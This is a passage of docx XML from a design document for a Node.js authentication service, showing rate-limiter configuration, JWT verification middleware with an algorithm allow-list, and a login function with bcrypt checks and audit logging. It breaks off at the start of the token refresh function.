              </w:rPr>
              <w:t xml:space="preserve">    message: 'Too many requests. Please slow down and try again later.',</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    details: null,</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const loginLimiter = rateLimit({</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  windowMs: env.LOGIN_RATE_WINDOW_MS,      // 15 min</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  max:      env.LOGIN_RATE_MAX,            // 10 attempts</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  standardHeaders: true, legacyHeaders: false,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  keyGenerator: req =&gt; req.ip,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  handler: rateLimitHandler,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  skipSuccessfulRequests: true,            // good logins don't burn the budget</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const refreshLimiter = rateLimit({</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  windowMs: 60 * 1000,                     // 1 min</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  max: 30,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  standardHeaders: true, legacyHeaders: false,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  keyGenerator: req =&gt; req.ip,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  handler: rateLimitHandler,</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module.exports = { loginLimiter, refreshLimiter };</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t>4.6.2  authenticate.js</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src/middleware/authenticate.js</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>'use strict';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const jwt = require('jsonwebtoken');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const jwtCfg = require('../config/jwt');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const { errors } = require('./errorHandler');</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function authenticate(req, _res, next) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  const header = req.headers.authorization;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  if (!header || typeof header !== 'string' || !header.startsWith('Bearer ')) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    return next(errors.unauthorized('Missing Bearer token'));</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const token = header.slice(7).trim();</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  if (!token) return next(errors.unauthorized('Missing Bearer token'));</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let payload;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  try {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    payload = jwt.verify(token, jwtCfg.accessSecret, { algorithms: [jwtCfg.alg] });</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  } catch (e) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    if (e?.name === 'TokenExpiredError') return next(errors.unauthorized('Token expired'));</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    if (e?.name === 'JsonWebTokenError')  return next(errors.unauthorized('Token invalid'));</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    return next(errors.unauthorized());</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req.user = {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    employeeId:  payload.sub,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    userId:      payload.uid,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    role:        payload.role,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    permissions: Array.isArray(payload.permissions) ? payload.permissions : [],</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next();</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module.exports = authenticate;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="10200"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="10200"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FEE2E2"/>
            <w:tcBorders>
              <w:left w:val="single" w:sz="24" w:color="B91C1C"/>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="80"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="B91C1C"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">SECURITY  ·  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="21"/>
              </w:rPr>
              <w:t>alg-confusion defence</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>jwt.verify() is given an explicit algorithms allow-list ([HS256]).</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Without this, an attacker could craft a token with alg:'none' or attempt RS-vs-HS confusion attacks.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Three distinct error messages (Missing / Expired / Invalid) so the FE interceptor can branch precisely.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>4.7  auth.service.js — Where Authentication Happens</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Composes the repos, applies BR-AUTH-01..07, emits typed AppErrors for the controller to forward. The single most security-critical detail in this file is the THEFT DETECTION block in refresh(): a refresh JWT with valid signature but missing/revoked in DB triggers revokeAllForUser — kicking attacker and legitimate user out, forcing a full re-login.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t>4.7.1  login()</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auth.service.js · login()</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>async function login({ employeeId, password, ipAddress, userAgent }) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  const GENERIC_FAIL = 'Invalid credentials';  // same msg for all 4 fail paths — no enumeration</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const user = await usersRepo.findByEmployeeId(employeeId);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  if (!user) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    await auditRepo.record({ employeeId, outcome: 'FAILED_NOT_FOUND', ipAddress, userAgent });</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    throw errors.unauthorized(GENERIC_FAIL);</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if (!user.is_active) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    await auditRepo.record({ employeeId, outcome: 'FAILED_USER_INACTIVE', ipAddress, userAgent });</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    throw errors.unauthorized(GENERIC_FAIL);</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if (user.is_locked) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    await auditRepo.record({ employeeId, outcome: 'FAILED_USER_LOCKED', ipAddress, userAgent });</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    throw errors.unauthorized(GENERIC_FAIL);</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const ok = await bcrypt.compare(password, user.password_hash);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  if (!ok) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    await usersRepo.incrementFailedLogin(user.user_id);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    await auditRepo.record({ employeeId, outcome: 'FAILED_BAD_PASSWORD', ipAddress, userAgent });</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    throw errors.unauthorized(GENERIC_FAIL);</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const { role_code, permissions } = await usersRepo.loadRoleAndPermissions(user.user_id);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  const accessPayload = { sub: user.employee_id, uid: user.user_id, role: role_code, permissions };</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const accessToken  = jwt.sign(accessPayload, jwtCfg.accessSecret, {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    algorithm: jwtCfg.alg, expiresIn: jwtCfg.accessTtlSec,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    jwtid: `acc_${Date.now()}_${user.user_id}`,</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const refreshToken = jwt.sign(</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    { sub: user.employee_id, uid: user.user_id, type: 'refresh' },</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    jwtCfg.refreshSecret,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    { algorithm: jwtCfg.alg, expiresIn: jwtCfg.refreshTtlSec,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      jwtid: `ref_${Date.now()}_${user.user_id}` });</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const expiresAt = dayjs().add(jwtCfg.refreshTtlSec, 'second').toDate();</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  await refreshRepo.persist({</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    userId: user.user_id, rawToken: refreshToken,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    expiresAt, userAgent, ipAddress });</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await usersRepo.recordSuccessfulLogin(user.user_id, ipAddress);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  await auditRepo.record({ employeeId, outcome: 'SUCCESS', ipAddress, userAgent });</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return { accessToken, refreshToken, user: accessPayload };</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t>4.7.2  refresh() — rotation + theft detection</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auth.service.js · refresh()</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>async function refresh({ rawRefreshToken, ipAddress, userAgent }) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  if (!rawRefreshToken) throw errors.unauthorized('No refresh token');</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let payload;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
